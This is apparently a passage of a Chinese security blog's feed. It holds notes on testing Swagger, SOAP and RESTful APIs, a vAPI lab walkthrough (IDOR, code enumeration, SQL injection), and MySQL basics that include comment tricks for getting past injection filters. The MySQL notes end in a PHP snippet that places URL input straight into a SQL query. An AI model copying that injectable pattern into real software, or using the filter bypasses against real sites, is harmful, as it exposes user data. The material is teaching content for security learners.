src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/9e272a71357b78318e8fbb13b6813c08.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/44ff507d565b3eff4816e6998034b35f.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1ae0160fa80b16b2ad6d7a781d8d3617.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/83b4953ad8c8769d18fb70dc9d2c8b38.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/97ef79b74f7629c611ed42a4b9466dcc.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/df2af8ee492cf0024ecf09084cb52609.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/7a3781adc813fe217c9dfc9fa0657ab3.png" alt="img"></p><h1 id="OpenApi-Swagger"><a href="#OpenApi-Swagger" class="headerlink" title="OpenApi - Swagger"></a>OpenApi - Swagger</h1><h2 id="Postman-联动burp-xray-1"><a href="#Postman-联动burp-xray-1" class="headerlink" title="Postman 联动burp+xray"></a>Postman 联动burp+xray</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/8e4d4d05c1683f1776253ddfa88f94b3.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/acdd2043dee2cd7af9e0e987bce02eeb.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1b4ef5626ce8bb5c1f1e8e526c786fd8.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/ed6ba05380676e5540f9ccf544367252.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/712e00369e5fe96e249333a1189c6205.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1bea4216ede10fc12527d635a1dbb731.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/0b83ebf5dee7610e344160fc90a92227.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1b828cd60678cd1c70ccd6b710c732ac.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/64cd86cfb5839b2eb709be838c88342b.png" alt="img"></p><p>提前设置好代理</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/77f65e4f4fc29ca72975a77905731f74.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3bd65e361b20c86e4653c6cff0c0af90.png" alt="img"></p><p><a href="https://github.com/lijiejie/swagger-exp">https://github.com/lijiejie/swagger-exp</a></p><p><a href="https://github.com/jayus0821/swagger-hack">https://github.com/jayus0821/swagger-hack</a></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/65f12727c94924458eb85b4eec0a0793.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/d675fdfd9cfbb5a84ab8657a98ebde3f.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/a36028af809eb2fa6e56dc60b7a5d5bb.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/83bf8469d3e98a474061e44af607348e.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/4b0baeb2f06cbeed36c877789319e4dd.png" alt="img"></p><h2 id="APIKit插件-可联动xray-1"><a href="#APIKit插件-可联动xray-1" class="headerlink" title="APIKit插件(可联动xray)"></a>APIKit插件(可联动xray)</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/0f0bdb8dfab79c93ebd5a88ccbfda931.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/067515b62c9a84a25751b73e7662a43a.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/ee4fe9d958f40142efe73ec1e377e5ec.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/770811f436d8d1cc1684a7d71f0cb1a9.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/801f339c5c8be72c8c64ae47f0230251.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/259103553b5936ec496886f3e26d8f8f.png" alt="img"></p><h1 id="RESTful-v1-api"><a href="#RESTful-v1-api" class="headerlink" title="RESTful - &#x2F;v1&#x2F;api&#x2F;"></a>RESTful - &#x2F;v1&#x2F;api&#x2F;</h1><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/a992facb37bf21e2a2990c99b32cb3d5.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/e460f98cf302a605d252ae642235f407.png" alt="img"></p><h2 id="vapi靶场"><a href="#vapi靶场" class="headerlink" title="vapi靶场"></a>vapi靶场</h2><p>无法连接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://raw.githubusercontent.com/roottusk/vapi/master/postman/vAPI.postman_collection.json</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250310230455073.png" alt="image-20250310230455073"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/dc30b712de55148cae049d5555ca9ea0.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/ccb64a4f0b565b3aad2d7b7458190fb7.png" alt="img"></p><p>API1-身份越权</p><p>ID值更改遍历用户信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/5e79de64ee953613fac01964c9a39f2b.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/0cf586972ad3ef149f001eb5e668f88c.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/e586c63e1a88dbbf5cdc6f1de316c4aa.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/27c827691fd0ccd991612b77ad0f48dc.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/f5b7edf851d064778b3782fa52597f1f.png" alt="img"></p><p>API4-手机验证码枚举</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/f1695990410fb1493d8cf5ff6802ebff.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/326ba47dd2734e3a9123c839d7f973b2.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/f0690049ab197309205e3cc09142eb58.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/6df682a31ed81ee539c2d499933a4b25.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3d1ed7570c9a2782e1de5479b64907f9.png" alt="img"></p><p>API5-接口遍历</p><p>更改URL地址尝试获取所有用户信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/c0ee3706528212f9d199bfbb22ddf104.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/e9e2c9097d70029df9fae64436b7f8db.png" alt="img"></p><p>API8-数据库注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/e5b8b8760c7947921436cb9c50d5e058.png" alt="img"></p><p>API9-V1&#x2F;2多版本<br>V2无法爆破&#x2F;V1爆破1655</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1bf2d6f453bae06e17f59fcf5714975a.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/8bded545d06de9134245ce61ef60f695.png" alt="img"></p><h1 id="SOAP-Swagger-RESTful挖掘案例"><a href="#SOAP-Swagger-RESTful挖掘案例" class="headerlink" title="SOAP&amp;Swagger&amp;RESTful挖掘案例"></a>SOAP&amp;Swagger&amp;RESTful挖掘案例</h1><h2 id="SOAP-WSDL漏扫SQL注入-数据库权限"><a href="#SOAP-WSDL漏扫SQL注入-数据库权限" class="headerlink" title="SOAP-WSDL漏扫SQL注入-数据库权限"></a>SOAP-WSDL漏扫SQL注入-数据库权限</h2><p>1、发现SOAP接口</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/926eb04758acca60b29588ae2295b8db.png" alt="img"></p><p>2、导入工具分析并扫描</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/72d80df9c65a4eee654e632d8e9795ea.png" alt="img"></p><p>3、发现存在SQL注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/497db4ca74fdbb03077eae41c629e8b5.png" alt="img"></p><p>4、利用当前接口进行数据包注入</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/be45a5b3c623002ba74416c6afd7bad8.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1f6e213ba30bb8c83d22a6075d124c96.png" alt="img"></p><h2 id="SOAP-WSDL泄漏密码获取接口-后台权限"><a href="#SOAP-WSDL泄漏密码获取接口-后台权限" class="headerlink" title="SOAP-WSDL泄漏密码获取接口-后台权限"></a>SOAP-WSDL泄漏密码获取接口-后台权限</h2><p>访问后台路由&#x2F;admin&#x2F;externalLogin，重定向到&#x2F;admin，是后台的登陆界面</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3ac27f1ea195b4ad0387fecbbd584f67.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/e13c9d877f9c7a23d8f4a00d291493c8.png" alt="img"></p><h2 id="OpenAPI-Swagger接口项目发包-越权信息泄漏"><a href="#OpenAPI-Swagger接口项目发包-越权信息泄漏" class="headerlink" title="OpenAPI-Swagger接口项目发包-越权信息泄漏"></a>OpenAPI-Swagger接口项目发包-越权信息泄漏</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/cef9cae5907066cf7fa5cf29fda49aca.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/65296c98e7dee5aab0bcb86bd7d14ac8.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/e9bea503758a282df31a5e3604bbf0af.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1e7c4d4630adc6b710002516fa071cd6.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> OWASP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> API安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql</title>
      <link href="/2025/05/27/Mysql/"/>
      <url>/2025/05/27/Mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="数据库相关知识"><a href="#数据库相关知识" class="headerlink" title="数据库相关知识"></a>数据库相关知识</h1><p>结构化信息或数据的有组织的集合，通常有数据库管理系统（DBMS）来控制</p><p>大多数数据库使用结构化查询语言（SQL）来编写和查询数据</p><p>简单来说就是存放数据的仓库</p><p>整个数据库系统可以包含多个数据库，一个数据库可以包含多个数据表，一个数据表可以有多个列（字段）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718034430932-32d6254b-b631-4b3f-88da-30f2a6e6d9b1.png"></p><h1 id="连接数据库方法"><a href="#连接数据库方法" class="headerlink" title="连接数据库方法"></a>连接数据库方法</h1><ol><li>MySQL命令行（cmd中执行mysql -uroot -p）</li><li>使用数据库连接软件（例如phpstudy自带的MySQL-Front、Navicat、phpMyAdmin等）</li><li>php连接数据库（写php代码来进行连接操作）</li></ol><h1 id="数据库操作"><a href="#数据库操作" class="headerlink" title="数据库操作"></a>数据库操作</h1><h2 id="增"><a href="#增" class="headerlink" title="增"></a>增</h2><p>向数据库中插入数据</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">插入单条数据</span><br><span class="line"><span class="keyword">insert into</span> 表名(字段<span class="number">1</span>，字段<span class="number">2</span>，.......）<span class="keyword">values</span>(值<span class="number">1</span>,值<span class="number">2</span>,.......);</span><br><span class="line"></span><br><span class="line">               插入多条数据</span><br><span class="line">               <span class="keyword">insert into</span> 表名</span><br><span class="line">               (字段<span class="number">1</span>，字段<span class="number">2</span>，.......）</span><br><span class="line"> <span class="keyword">values</span></span><br><span class="line"> (值<span class="number">1</span>,值<span class="number">2</span>,.......),</span><br><span class="line"> (值<span class="number">11</span>,值<span class="number">12</span>,.......),</span><br><span class="line"> (值<span class="number">21</span>,值<span class="number">22</span>,.......);</span><br><span class="line"></span><br><span class="line"> 举例</span><br><span class="line"> <span class="keyword">insert into</span> guestbook(comment,name) <span class="keyword">values</span>(&quot;111&quot;,&quot;222&quot;);</span><br><span class="line"> <span class="operator">/</span><span class="operator">/</span>向guestbook表中的comment列和name列分别插入<span class="number">111</span>和<span class="number">222</span></span><br></pre></td></tr></table></figure><h2 id="删"><a href="#删" class="headerlink" title="删"></a>删</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> 表名 <span class="keyword">where</span> 条件;</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> guestbook <span class="keyword">where</span> comment_id<span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>删除guestbook表中comment_id列的值为<span class="number">2</span>的数据</span><br></pre></td></tr></table></figure><h2 id="改"><a href="#改" class="headerlink" title="改"></a>改</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">update</span> 表名 <span class="keyword">set</span> 字段名<span class="operator">=</span>&quot;值&quot; [<span class="keyword">where</span>条件];</span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span>为可选项，使用<span class="keyword">where</span>时只会修改满足<span class="keyword">where</span>条件的行，不加<span class="keyword">where</span>会将该列所有的值修改</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"><span class="keyword">update</span> guestbook <span class="keyword">set</span> comment<span class="operator">=</span>&quot;333&quot;;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将guestbook数据表中的comment列的所有值改为<span class="number">333</span></span><br><span class="line"><span class="keyword">update</span> guestbook <span class="keyword">set</span> comment<span class="operator">=</span>&quot;666&quot; <span class="keyword">where</span> comment_id<span class="operator">=</span><span class="number">2</span>;</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>将guestbook表中的comment_id列的值为<span class="number">2</span>的comment的值改为<span class="number">666</span></span><br></pre></td></tr></table></figure><h2 id="查"><a href="#查" class="headerlink" title="查"></a>查</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> 表名;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span><span class="operator">/</span>字段 <span class="keyword">from</span> 表名 [<span class="keyword">where</span>条件];</span><br><span class="line"></span><br><span class="line"><span class="keyword">show</span> databases <span class="comment">--查看有哪些数据库</span></span><br><span class="line">use 数据库名  <span class="comment">--使用数据库</span></span><br><span class="line"><span class="keyword">show</span> tables  <span class="comment">--查看有哪些表</span></span><br></pre></td></tr></table></figure><h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 列名(字段名) [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>];</span><br><span class="line"><span class="comment">-- 将表中的内容按照某一列（字段）进行排序</span></span><br><span class="line"><span class="keyword">ASC</span>表示升序，为默认值，<span class="keyword">DESC</span>表示降序</span><br><span class="line"></span><br><span class="line">当<span class="keyword">order</span> <span class="keyword">by</span>后的数字大于当前列数，会报错</span><br></pre></td></tr></table></figure><h2 id="LIMIT限制"><a href="#LIMIT限制" class="headerlink" title="LIMIT限制"></a>LIMIT限制</h2><p>用于限制select语句返回指定的记录数</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 LIMIT 偏移量,限制条数;</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line">LIMIT <span class="number">5</span>； <span class="comment">-- 5表示限制条数（只返回查询的前五行）</span></span><br><span class="line">LIMIT <span class="number">1</span>,<span class="number">5</span> <span class="comment">-- 1表示偏移量，5表示限制条数（返回从1+1=2开始，往后5行）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">3</span>,<span class="number">5</span>;<span class="comment">-- 检索4-8行</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span>;<span class="comment">-- 检索第1行</span></span><br></pre></td></tr></table></figure><h2 id="MySQL注释"><a href="#MySQL注释" class="headerlink" title="MySQL注释"></a>MySQL注释</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"><span class="comment">--空格</span></span><br><span class="line"><span class="comment">--+（在URL中空格会被编码为+）</span></span><br><span class="line"><span class="comment">/*...*/</span></span><br></pre></td></tr></table></figure><h3 id="注释符可以替换为空格"><a href="#注释符可以替换为空格" class="headerlink" title="注释符可以替换为空格"></a>注释符可以替换为空格</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="comment">/*123*/</span>id,username,password<span class="comment">/*123*/</span><span class="keyword">from</span><span class="comment">/*123*/</span>users<span class="comment">/*123*/</span>limit<span class="comment">/*123*/</span><span class="number">0</span>,<span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* */</span>中的内容被注释掉了，可以用其代替空格</span><br><span class="line">当空格被过滤时可以进行绕过</span><br></pre></td></tr></table></figure><h3 id="内联注释"><a href="#内联注释" class="headerlink" title="内联注释"></a>内联注释</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*!/*!*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* */</span> 在mysql中是多行注释 但是如果里面加了<span class="operator">!</span> 那么后面的内容会被执行</span><br><span class="line"></span><br><span class="line">举例</span><br><span class="line"><span class="keyword">select</span><span class="comment">/*123*/</span><span class="operator">*</span><span class="comment">/*123*/</span><span class="keyword">from</span><span class="comment">/*!users*/</span>limit<span class="comment">/*123*/</span><span class="number">0</span>,<span class="number">3</span>;</span><br><span class="line"><span class="comment">-- /*！users*/中的users有效，会被当作代码执行</span></span><br></pre></td></tr></table></figure><h3 id="单行注释加换行"><a href="#单行注释加换行" class="headerlink" title="单行注释加换行"></a>单行注释加换行</h3><p>单行注释加换行也可以执行</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>#asdf</span><br><span class="line">users;</span><br><span class="line"></span><br><span class="line"><span class="comment">--将users换行后，有效执行</span></span><br></pre></td></tr></table></figure><h1 id="系统数据库"><a href="#系统数据库" class="headerlink" title="系统数据库"></a>系统数据库</h1><p>MySQL5.0以上自带information_schema这个数据库，5.0以下没有</p><p>information_schema是一个信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1718036402486-fc2dee82-39b9-4221-b634-6e1bbf183be7.png"></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">-</span> SCHEMATA 表：提供了当前mysql实例中所有数据库的信息。</span><br><span class="line">    <span class="keyword">show</span> databases; 的结果取之此表。</span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。</span><br><span class="line">    <span class="keyword">show</span> tables <span class="keyword">from</span> schemaname; (schemaname为指定数据库名)的结果取之此表。 </span><br><span class="line"></span><br><span class="line"><span class="operator">-</span> COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。</span><br><span class="line">    <span class="keyword">show</span> columns <span class="keyword">from</span> schemaname.tablename; (schemaname为指定数据库名, tablename为指定数据库下的数据表名)的结果取之此表。 </span><br></pre></td></tr></table></figure><h2 id="查询数据库名"><a href="#查询数据库名" class="headerlink" title="查询数据库名"></a>查询数据库名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br></pre></td></tr></table></figure><h2 id="查询某个数据库下的表名"><a href="#查询某个数据库下的表名" class="headerlink" title="查询某个数据库下的表名"></a>查询某个数据库下的表名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span>;</span><br><span class="line"><span class="comment">-- 查询security数据库下的表名</span></span><br></pre></td></tr></table></figure><h2 id="查询某个数据库下某个表的列名"><a href="#查询某个数据库下某个表的列名" class="headerlink" title="查询某个数据库下某个表的列名"></a>查询某个数据库下某个表的列名</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"><span class="comment">-- 查询security数据库下的user表中的列名</span></span><br></pre></td></tr></table></figure><h2 id="查询表中的具体内容"><a href="#查询表中的具体内容" class="headerlink" title="查询表中的具体内容"></a>查询表中的具体内容</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> security.users;</span><br><span class="line"><span class="comment">-- 查询security数据库中users表中的所有内容</span></span><br></pre></td></tr></table></figure><h1 id="PHP操作数据库"><a href="#PHP操作数据库" class="headerlink" title="PHP操作数据库"></a>PHP操作数据库</h1><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接</span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测连接</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$conn</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="title function_ invoke__">mysqli_connect_error</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;连接成功&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="查询"><a href="#查询" class="headerlink" title="查询"></a>查询</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="variable">$servername</span> = <span class="string">&quot;localhost&quot;</span>;  </span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;root&quot;</span>;  </span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;root&quot;</span>;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建连接  </span></span><br><span class="line"><span class="variable">$conn</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="variable">$servername</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 选择数据库  </span></span><br><span class="line"><span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;security&#x27;</span>);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;  </span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];  </span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from users where id = <span class="subst">$id</span>&quot;</span>;  </span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);  </span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);  </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$row</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">else</span>  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;  </span><br><span class="line">        <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Tips </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker</title>
      <link href="/2025/05/27/Docker/"/>
      <url>/2025/05/27/Docker/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.runoob.com/docker/docker-tutorial.html">Docker 教程 | 菜鸟教程</a></p><h1 id="云服务器介绍（vps）"><a href="#云服务器介绍（vps）" class="headerlink" title="云服务器介绍（vps）"></a>云服务器介绍（vps）</h1><blockquote><p>vps介绍</p><p><strong>虚拟专用服务器</strong>（英语：Virtual private server，缩写为VPS），是将一台<a href="https://zh.wikipedia.org/wiki/%E6%9C%8D%E5%8A%A1%E5%99%A8">服务器</a>分割成多个虚拟专用服务器的服务。实现VPS的技术分为<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1%E5%B1%A4%E8%99%9B%E6%93%AC%E5%8C%96">容器</a>技术和<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E6%9C%BA">虚拟机</a>技术。在容器或虚拟机中，每个VPS都可分配独立公网<a href="https://zh.wikipedia.org/wiki/IP%E5%9C%B0%E5%9D%80">IP地址</a>、独立<a href="https://zh.wikipedia.org/wiki/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">操作系统</a>、实现不同VPS间磁盘空间、<a href="https://zh.wikipedia.org/wiki/%E5%86%85%E5%AD%98">内存</a>、<a href="https://zh.wikipedia.org/wiki/CPU">CPU</a>资源、进程和系统配置的隔离，为用户和<a href="https://zh.wikipedia.org/wiki/%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F">应用程序</a>模拟出“独占”使用计算资源的体验。VPS可以像独立服务器一样，重装操作系统，安装程序，单独重启服务器。VPS为用户提供了管理配置的自由，可用于企业虚拟化，也可以用于<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E4%B8%AD%E5%BF%83">IDC</a>资源租用。</p><p>IDC资源租用由VPS提供商提供。不同VPS提供商所使用的硬件、软件的差异，及销售策略的不同，VPS的使用体验也有较大差异。尤其是VPS提供商超卖，导致实体服务器超负荷时，VPS性能将受到极大影响。相对来说，<a href="https://zh.wikipedia.org/wiki/%E4%BD%9C%E6%A5%AD%E7%B3%BB%E7%B5%B1%E5%B1%A4%E8%99%9B%E6%93%AC%E5%8C%96">容器</a>技术比<a href="https://zh.wikipedia.org/wiki/%E8%99%9A%E6%8B%9F%E6%9C%BA">虚拟机</a>技术效率更高，成本更低，但功能更少，更易超卖，一般来说容器VPS的价格都低于虚拟机VPS的价格。</p><p>这些VPS主机以最大化的效率共享<a href="https://zh.wikipedia.org/wiki/%E7%A1%AC%E4%BB%B6">硬件</a>、<a href="https://zh.wikipedia.org/wiki/%E8%BD%AF%E4%BB%B6%E8%AE%B8%E5%8F%AF%E8%AF%81">软件许可证</a>以及管理资源。每个VPS主机都可分配独立<a href="https://zh.wikipedia.org/wiki/%E5%85%AC%E7%B6%B2">公网</a><a 